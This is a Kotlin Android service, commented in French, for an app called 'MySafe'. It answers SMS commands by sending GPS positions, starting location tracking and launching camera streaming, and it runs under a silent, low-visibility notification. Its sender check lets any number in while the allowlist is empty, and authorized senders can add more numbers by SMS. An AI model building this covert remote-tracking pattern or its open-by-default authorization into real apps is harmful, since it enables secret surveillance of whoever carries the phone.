package com.mysafe.mysafe

import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.*
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat
import java.text.SimpleDateFormat
import java.util.*

class MySafeAgentService : Service() {
    companion object {
        const val TAG = "MySafe_Agent"
        const val ACTION_START = "AGENT_START"
        const val ACTION_STOP = "AGENT_STOP"
        const val CHANNEL_ID = "MySafeAgent"
        
        private var instance: MySafeAgentService? = null
        fun isRunning() = instance != null
        
        // Callback pour le récepteur SMS
        var commandeRecue: ((String, String) -> Unit)? = null
        
        // 🔢 Liste des numéros autorisés (ajoutables par macro)
        private val numerosAutorises = mutableSetOf<String>()
        fun ajouterNumeroAutorise(numero: String) {
            val nettoye = numero.replace(Regex("[^0-9]"), "")
            if (nettoye.length >= 6) {
                numerosAutorises.add(nettoye)
                Log.d(TAG, "✅ Numéro autorisé ajouté: $nettoye")
            }
        }
        fun estAutorise(numero: String): Boolean {
            val nettoye = numero.replace(Regex("[^0-9]"), "")
            return numerosAutorises.isEmpty() || numerosAutorises.any { nettoye.endsWith(it) }
        }
    }

    private var lastLocation: Location? = null
    private val MIN_DISTANCE_METERS = 10f
    private val MIN_TIME_INTERVAL = 90000L // 1min30s
    private var isTracking = false
    private var lastSentTime = 0L

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            lastLocation = location
            verifierEtEnvoyerPosition(location)
        }
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        override fun onProviderEnabled(provider: String) {}
        override fun onProviderDisabled(provider: String) {}
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        creerNotificationCanal()
        startForeground(1, creerNotificationDiscrete())
        
        commandeRecue = { commande, numero ->
            traiterCommandeOuMacro(commande, numero)
        }
        
        Log.d(TAG, "🔒 AGENT + SYSTÈME DE MACROS ACTIF !")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> demarrerSuiviGPS()
            ACTION_STOP -> arreterSuiviGPS()
        }
        return START_STICKY
    }

    // ==========================================
    // 🎮 SYSTÈME DE MACROS — ICI TOUT SE PASSE !
    // ==========================================
    private fun traiterCommandeOuMacro(commandeBrute: String, numeroExpediteur: String) {
        val commande = commandeBrute.trim()
        val numeroNettoye = numeroExpediteur.replace(Regex("[^0-9]"), "")
        
        Log.d(TAG, "📩 Commande/Macro reçue: '$commande' de $numeroNettoye")
        
        // ✅ Vérification autorisation
        if (!estAutorise(numeroExpediteur)) {
            Log.w(TAG, "⚠️ Numéro non autorisé: $numeroExpediteur")
            return
        }

        // 🎮 MACROS — UN SEUL SMS = PLUSIEURS ACTIONS
        when {
            commande.startsWith("MYSAFE_MACRO:") -> {
                val macro = commande.removePrefix("MYSAFE_MACRO:").trim()
                executerMacro(macro, numeroExpediteur)
            }
            
            // Commandes simples (compatibilité)
            commande == "MYSAFE_SEND_POS" -> {
                envoyerPositionParSMS(numeroExpediteur)
            }
            commande == "MYSAFE_START_TRACK" -> {
                demarrerSuiviGPS()
                envoyerConfirmation(numeroExpediteur, "SUIVI_ACTIF")
            }
            commande == "MYSAFE_STOP_TRACK" -> {
                arreterSuiviGPS()
                envoyerConfirmation(numeroExpediteur, "SUIVI_ARRETE")
            }
            commande == "MYSAFE_CAMERA_ON" -> {
                demarrerStreaming()
                envoyerConfirmation(numeroExpediteur, "CAMERA_OK")
            }
        }
    }

    private fun executerMacro(nomMacro: String, numero: String) {
        Log.d(TAG, "🎮 EXÉCUTION MACRO: $nomMacro")
        
        when (nomMacro.uppercase()) {
            "TOUT" -> {
                // 🎯 MACRO TOUT : Position + Caméra + Réponse
                envoyerPositionParSMS(numero)
                demarrerStreaming()
                envoyerConfirmation(numero, "MACRO_TOUT_OK")
            }
            
            "TRACK" -> {
                // 📍 MACRO TRACK : Démarre suivi + envoie position immédiate
                demarrerSuiviGPS()
                envoyerPositionParSMS(numero)
                envoyerConfirmation(numero, "MACRO_TRACK_OK")
            }
            
            "ARRET", "STOP" -> {
                // ⏹️ MACRO ARRÊT : Arrête suivi + caméra
                arreterSuiviGPS()
                envoyerConfirmation(numero, "MACRO_ARRET_OK")
            }
            
            "RAPIDE", "POS" -> {
                // ⚡ MACRO RAPIDE : Position instantanée seulement
                envoyerPositionParSMS(numero)
            }
            
            "ETAT", "STATUS" -> {
                // 📊 MACRO ÉTAT : Infos système
                val etat = StringBuilder()
                etat.append("MYSAFE_ETAT:")
                etat.append("suivi=${if(isTracking) "ACTIF" else "INACTIF"};")
                etat.append("gps=${if(lastLocation!=null) "OK" else "NON"};")
                etat.append("temps=${SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())}")
                envoyerSMS(numero, etat.toString())
            }
            
            else -> {
                // ⚙️ MACRO PERSONNALISÉE : ajouter numéro autorisé
                if (nomMacro.startsWith("PERSO;")) {
                    val parts = nomMacro.split(";")
                    if (parts.size >= 2) {
                        val nouveauNumero = parts[1]
                        ajouterNumeroAutorise(nouveauNumero)
                        envoyerConfirmation(numero, "MACRO_PERSO_OK:$nouveauNumero")
                    }
                } else {
                    Log.w(TAG, "❌ Macro inconnue: $nomMacro")
                }
            }
        }
    }

    private fun demarrerSuiviGPS() {
        if (isTracking) return
        isTracking = true
        
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            lm.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                MIN_TIME_INTERVAL,
                MIN_DISTANCE_METERS,
                locationListener
            )
            lm.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                MIN_TIME_INTERVAL,
                MIN_DISTANCE_METERS,
                locationListener
            )
            Log.d(TAG, "✅ SUIVI GPS ACTIF — 10m / 1min30")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Erreur GPS", e)
        }
    }

    private fun arreterSuiviGPS() {
        isTracking = false
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        lm.removeUpdates(locationListener)
        Log.d(TAG, "✅ SUIVI GPS ARRÊTÉ")
    }

    private fun verifierEtEnvoyerPosition(location: Location) {
        val maintenant = System.currentTimeMillis()
        
        val lastLoc = lastLocation ?: run {
            envoyerPositionATousNumeros(location)
            lastSentTime = maintenant
            return
        }

        val distance = location.distanceTo(lastLoc)
        val tempsEcoule = maintenant - lastSentTime

        if (distance >= MIN_DISTANCE_METERS || tempsEcoule >= MIN_TIME_INTERVAL) {
            envoyerPositionATousNumeros(location)
            lastSentTime = maintenant
        }
    }

    private fun envoyerPositionParSMS(destinataire: String) {
        val loc = lastLocation ?: return
        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
        val message = "MYSAFE_POS:${loc.latitude},${loc.longitude},$time"
        envoyerSMS(destinataire, message)
    }

    private fun envoyerConfirmation(destinataire: String, reponse: String) {
        envoyerSMS(destinataire, "MYSAFE_ACK:$reponse")
    }

    private fun envoyerSMS(destinataire: String, message: String) {
        try {
            SmsManager.getDefault().sendTextMessage(destinataire, null, message, null, null)
            Log.d(TAG, "📤 SMS envoyé à $destinataire: $message")
        } catch (e: Exception) {
            try {
                SmsManager.getDefault().sendDataMessage(
                    destinataire, null, 50006.toShort(),
                    message.toByteArray(Charsets.UTF_8), null, null
                )
                Log.d(TAG, "📤 SMS données envoyé à $destinataire")
            } catch (e2: Exception) {
                Log.e(TAG, "❌ Échec envoi", e2)
            }
        }
    }

    private fun envoyerPositionATousNumeros(location: Location) {
        Log.d(TAG, "📍 Position mise à jour: ${location.latitude}, ${location.longitude}")
    }

    private fun demarrerStreaming() {
        val intent = Intent(this, StreamingActivity::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun creerNotificationCanal() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val canal = NotificationChannel(CHANNEL_ID, "MySafe Service", NotificationManager.IMPORTANCE_LOW)
            canal.setShowBadge(false)
            canal.enableVibration(false)
            canal.setSound(null, null)
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(canal)
        }
    }

    private fun creerNotificationDiscrete(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("MySafe")
            .setContentText("Service actif")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setContentIntent(PendingIntent.getActivity(this, 0, Intent(), PendingIntent.FLAG_IMMUTABLE))
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        arreterSuiviGPS()
        instance = null
        commandeRecue = null
        Log.d(TAG, "🔒 AGENT ARRÊTÉ")
    }
}
